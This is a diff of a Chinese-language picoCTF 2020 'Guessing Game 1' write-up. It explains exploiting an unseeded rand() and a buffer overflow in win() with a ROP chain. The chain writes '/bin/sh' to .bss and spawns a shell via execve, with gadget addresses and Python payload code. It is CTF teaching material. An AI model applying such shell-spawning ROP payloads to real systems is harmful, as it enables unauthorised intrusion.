@@ -12,16 +12,19 @@ https://play.picoctf.org/events/3/challenges/challenge/90
 
 ## 開始
 
-我們先看看Makefile
+我們先看看 Makefile
+
 ```make
 all:
   gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c
 clean:
   rm vuln
 ```
+
 這個程式可能有 Buffer Overflow，它用 static link，不能改 plt, got
 
 看看 `do_stuff` 和 `get_random`
+
 ```c
 long get_random() {
   return rand() % BUFSIZE;
@@ -50,21 +53,25 @@ int do_stuff() {
 }
 
 ```
+
 輸入用 `fgets`，沒有 Buffer Overflow
 
-但`rand` 沒有初始化，它的值一直是固定的
+但 `rand` 沒有初始化，它的值一直是固定的
 
-用 gdb 可以很快找到`ans`的值
+用 gdb 可以很快找到 `ans` 的值
 
 ![](/img/picoCTF2020-Guessing-Game-1/random_num.png)
 `ans` 固定為 `84`
+
+> 補注: 截圖沒有截到 `rax`，但是 `rax` 應是 84
 
 可以進到 `win` 裡面了
 ![](/img/picoCTF2020-Guessing-Game-1/access_first_level.png)
 
 ## 決定攻擊手法
 
-`win` 裡面有Buffer Overflow，明明`BUFSIZE`只有100，卻可以填360個字元
+`win` 裡面有 Buffer Overflow，明明 `BUFSIZE` 只有 100，卻可以填 360 個字元
+
 ```c++
 // BUFSIZE = 100
 void win() {
@@ -77,6 +84,7 @@ void win() {
 
 找到 padding
 ![](/img/picoCTF2020-Guessing-Game-1/offset.png)
+
 ```python
 payload = 'a'*120
 ```
@@ -84,13 +92,13 @@ payload = 'a'*120
 問題來了，我們可以用什麼方法破解它?
 
 1. Shellcode<br>
-    不行，有開 NX
+   不行，有開 NX
 2. return to libc<br>
-    它用 static link
+   它用 static link
 3. Format string<br>
-    printf 看起來不能利用
+   printf 看起來不能利用
 4. ROP<br>
-    好像可以
+   好像可以
 
 **決定用 ROP**
 
@@ -101,22 +109,26 @@ payload = 'a'*120
 ![](/img/picoCTF2020-Guessing-Game-1/cannot_find_pop_eax.png)
 
 把 `/bin/sh` 放到 `.bss` 段
+
 ```python
 payload += flat([pop_rax, buf, pop_rdx, '/bin', mov_drax_edx, \
                  pop_rax, buf+4, pop_rdx, '/sh\x00', mov_drax_edx])
 ```
 
 system call execve 參數
+
 - eax: 11
 - ebx: 字串 `/bin/sh` 的位置
 - ecx: 0
 - edx: 0
+
 ```python
 payload += flat([pop_rbx, buf, pop_rax, 11, pop_rdx, 0, int_0x80])
 ```
-> rcx 找不到適合的 gadget，只好先不理它，反正它常常是0
 
-> 想知道更多system call用法，可以到這個網站
+> rcx 找不到適合的 gadget，只好先不理它，反正它常常是 0
+
+> 想知道更多 system call 用法，可以到這個網站
 > https://syscalls.w3challs.com/?arch=x86
 
 ## 暫存器尺寸
@@ -125,9 +137,10 @@ payload += flat([pop_rbx, buf, pop_rax, 11, pop_rdx, 0, int_0x80])
 ![](/img/picoCTF2020-Guessing-Game-1/reg_size_problem.png)
 輸入的資料會黏在一起
 
-我們輸入的是 32-bit，但卻用64-bit的暫存器，所以必須在資料後面加上4個`\x00`
+我們輸入的是 32-bit，但卻用 64-bit 的暫存器，所以必須在資料後面加上 4 個`\x00`
 
-如果你用flat，可以在每個指令後面都加入一個0
+如果你用 flat，可以在每個指令後面都加入一個 0
+
 ```python
 flat([pop_rbx, 0, buf, 0, pop_rax, 0, 11, 0, pop_rdx, 0, 0, 0, int_0x80, 0])
 ```
@@ -154,7 +167,7 @@ mov_rax_rdx = 0x41b570
 int_0x80 = 0x468fea
 
 payload = 'a'*120
-payload += flat([pop_rax, 0, buf, 0, pop_rdx, 0, '/bin',0 , mov_drax_edx, 0, 
+payload += flat([pop_rax, 0, buf, 0, pop_rdx, 0, '/bin',0 , mov_drax_edx, 0,
                  pop_rax, 0, buf+4, 0, pop_rdx, 0, '/sh\x00',0 , mov_drax_edx, 0])
 payload += flat([pop_rbx, 0, buf, 0, \
                  pop_rax, 0, 11, 0, pop_rdx, 0, 0, 0, int_0x80, 0])
